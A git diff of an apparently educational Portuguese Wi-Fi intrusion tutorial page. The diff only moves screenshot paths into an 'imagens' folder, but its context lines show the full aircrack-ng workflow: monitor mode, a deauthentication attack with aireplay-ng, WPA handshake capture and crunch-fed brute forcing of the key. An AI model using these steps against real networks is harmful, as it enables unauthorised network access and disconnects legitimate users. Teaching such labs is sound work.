@@ -84,7 +84,7 @@ Verificar o nome da sua interface Wi-FI:<br />
 </p>
 </p>
 <p>
-<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/iwconfig.png"/>
+<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/imagens/iwconfig.png"/>
 </p> 
 <p>
 Após verificar o nome da interface, deve-se verificar se o Kali está reconhecendo o driver da interface sem fio: 
@@ -92,7 +92,7 @@ Após verificar o nome da interface, deve-se verificar se o Kali está reconhece
 <pre><code>airmon-ng
 </code></pre>
 </p>
-<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/airmon-ng.png"/>
+<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/imagens/airmon-ng.png"/>
 </p>
 <p>
 Após isso deve-se verificar se tem algum processo que pode acabar atrapalhando o processo de captura de pacotes:
@@ -100,7 +100,7 @@ Após isso deve-se verificar se tem algum processo que pode acabar atrapalhando 
 <pre><code>airmon-ng check kill
 </code></pre>
 </p>
-<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/airmon-ng_checkkill.png"/>
+<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/imagens/airmon-ng_checkkill.png"/>
 </p>
 <p>
 Vamos colocar nossa placa de rede em modo monitor:
@@ -109,7 +109,7 @@ Vamos colocar nossa placa de rede em modo monitor:
 iwconfig
 </code></pre>
 </p>
-<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/airmon-ng_startwlan.png"/>
+<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/imagens/airmon-ng_startwlan.png"/>
 </p>
 <p>
 Quando a placa estiver pronta para monitorar, podemos ver quais são as redes disponíveis para nossos possíveis ataques. É importante levar em conta o alcance da rede a ser invadida, pois caso esteja distante, o WPA HANDSHAKE não consiga ser capturado.
@@ -117,7 +117,7 @@ Quando a placa estiver pronta para monitorar, podemos ver quais são as redes di
 <pre><code>airodump-ng wlan0mon 
 </code></pre>
 </p>
-<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/airodump-ng_wlan0.png"/>
+<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/imagens/airodump-ng_wlan0.png"/>
 </p>
 <p>
 Após selecionar a rede alvo, utilizaremos algumas de suas informações. Você pode guardá-las em um bloco de notas. As informações são as seguintes:<br />
@@ -131,7 +131,7 @@ Agora que temos a rede alvo, iremos monitorá-la usando algumas das informaçõe
 <pre><code>airodump-ng -c [canal_da_rede_alvo] --bssid [bssid_da_rede_alvo] -w dados
 </code></pre>
 </p>
-<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/airodump.png"/>
+<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/imagens/airodump.png"/>
 </p>
 <p>
 Hora de capturar o tão esperado WPA HANDSHAKE. Para que seja capturado, é preciso que alguém se conecte à rede. Há duas opções: você espera a oportunidade que algum usuário se conecte ou você pode desautenticar quem já está conectado e capturar o WPA HANDSHAKE logo que o usuário se reconectar. Usaremos a segunda opção!
@@ -139,7 +139,7 @@ Hora de capturar o tão esperado WPA HANDSHAKE. Para que seja capturado, é prec
 <pre><code>aireplay-ng -0 10 -a [bssid_da_rede_alvo] wlan0mon
 </code></pre>
 </p>
-<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/aireplay-ng.png"/>
+<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/imagens/aireplay-ng.png"/>
 </p>
 <p>
 verificar o WPA HANDSHAKE capturado no arquivo criado anteriormente na execução do comando de captura. No caso deste tutorial, o arquivo criado recebeu o nome “dados”. Dê o seguinte comando no seu diretório atual:
@@ -148,7 +148,7 @@ verificar o WPA HANDSHAKE capturado no arquivo criado anteriormente na execuçã
 aircrack-ng net-01.cap
 </code></pre>
 </p>
-<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/aircrack-ng.png"/>
+<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/imagens/aircrack-ng.png"/>
 </p>
 <p>
 Hora de quebrar no Brute Force:
@@ -156,9 +156,9 @@ Hora de quebrar no Brute Force:
 <pre><code>crunch [min] [max] [padrão] | aircrack-ng [net-01.cap] -w - -e [essid_da_rede_alvo]
 </code></pre>
 </p>
-<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/aircrack-ng2.png"/>
-<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/aircrack-ng3.png"/>
-<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/keyfound.png"/>
+<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/imagens/aircrack-ng2.png"/>
+<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/imagens/aircrack-ng3.png"/>
+<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/imagens/keyfound.png"/>
 </p>
 
 <h1>Referências</h1>
